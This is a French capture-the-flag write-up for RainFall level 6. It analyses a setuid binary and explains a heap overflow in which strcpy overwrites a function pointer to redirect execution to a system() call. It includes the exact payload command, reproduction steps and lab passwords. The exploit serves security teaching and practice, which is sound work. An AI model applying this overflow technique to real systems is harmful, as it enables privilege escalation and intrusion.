## Connexion et exploration

```bash
ssh level6@192.168.1.150 -p 4243
```
> Le mot de passe est : `d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31`

Une fois connecté, cet écran s'affiche : 
```bash
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level6/level6
```

informations sur le binaire a exploiter :
```bash
level6@RainFall:~$ ls -l level6
-rwsr-s---+ 1 level7 users 5274 Mar  6  2016 level6
level6@RainFall:~$ file level6
level6: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xb1a5ce594393de0f273c64753cede6da01744479, not stripped
```

L'execution :
```bash
level6@RainFall:~$ ./level6
Segmentation fault (core dumped)
level6@RainFall:~$ ./level6 admin
Nope
```
> Segfault si aucun argument, "Nope" si argument

Analysons le binaire `objdump -R level6` 
```bash
level6:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
080497fc R_386_GLOB_DAT    __gmon_start__
0804980c R_386_JUMP_SLOT   strcpy
08049810 R_386_JUMP_SLOT   malloc
08049814 R_386_JUMP_SLOT   puts
08049818 R_386_JUMP_SLOT   system
0804981c R_386_JUMP_SLOT   __gmon_start__
08049820 R_386_JUMP_SLOT   __libc_start_main
```
[Resultat du objdump -d level6](./source/level6_objdump.txt)

Une fonction interessante dans le resultat de objdump -d : `<n>`. traduite en C, elle ressemble a ca :
```c
void n(void) {
    system(/* on ne sait pas encore ce qu'il y a ici */);
}
```

Et pour le main apres nettoyage (et reconstruction via [RetDec dans DogBolt](https://retdec.com/dogbolt/)) :
```c
int main(int argc, char **argv) {
    char *mem  = malloc(64);
    void (**mem2)(void) = malloc(sizeof(void (*)()));
    *mem2 = m;                   // mem2 pointe sur m()
    strcpy(mem, argv[1]);        // AUCUN contrôle de taille
    (*mem2)();                   // appel indirect => m()
}
```

On a donc : 
- un buffer de taille 64 sur la heap  
- un pointeur sur fonction (mem2) qui pointe sur m() dans la heap aussi  
- un strcpy sans controle de taille qui copie argv[1] dans le buffer de 64 octets  

Let's go pour un heap overflow, et remplacer `m()` par `n()` dans le pointeur de fonction `mem2` pour lancer le call `system(...)` et voir ce qu'il fait

<br>

## Construction du payload

Pour réussir l'attaque, il faut comprendre comment la mémoire est organisée lors de l'exécution du programme :

- `mem = malloc(64)` : alloue un espace de 64 octets pour le buffer.
- `mem2 = malloc(4)` : alloue juste après 4 octets pour le pointeur de fonction.

Sur les systèmes Linux 32 bits utilisant glibc, chaque zone allouée par `malloc` est précédée d'un petit en-tête (header) de 8 octets qui sert à la gestion interne de la mémoire.

Voici le schéma simplifié de la mémoire après ces deux allocations :

```
| 64 octets : buffer utilisateur (mem) |
| 8 octets : header du chunk suivant   |
| 4 octets : pointeur de fonction (mem2) |
```

Pour atteindre et écraser le pointeur de fonction (`mem2`) à partir du début du buffer (`mem`), il faut donc :

- Remplir les 64 octets du buffer
- Passer les 8 octets du header
- Arriver enfin sur les 4 octets du pointeur de fonction

**Total : 64 + 8 = 72 octets à sauter**  
Le payload devra donc contenir 72 octets de "remplissage" (n'importe quelles valeurs), puis l'adresse de la fonction à exécuter (celle du call system).

Toujours pareil pour l'adresse de la fonction `n()`, on la met en little-endian. D'après le objdump, l'adresse de `n` est `0x08048454`, donc en little-endian ça donne : `\x54\x84\x04\x08`

Avec python evidemment, ca peut ressembler à ca : 
```
./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
```

<br>

## Lancement de l'attaque :

On execute la commande avec le payload en argument :
```bash
level6@RainFall:~$ ./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

Essayons maintenant de s'authentifier au level7 avec ce mot de passe :
```bash
level6@RainFall:~$ su level7
Password: f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
# [...]
level7@RainFall:~$ whoami
level7
```

Ca fonctionne, on est bien level7

Le mot de passe du level7 est donc : `f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d`

<br>

## Pour reproduire l'attaque

1. Connexion en ssh au niveau 6
```bash
ssh level6@192.168.1.150 -p 4243
```

2. Execution de l'attque :
```bash
./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
# output : f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```
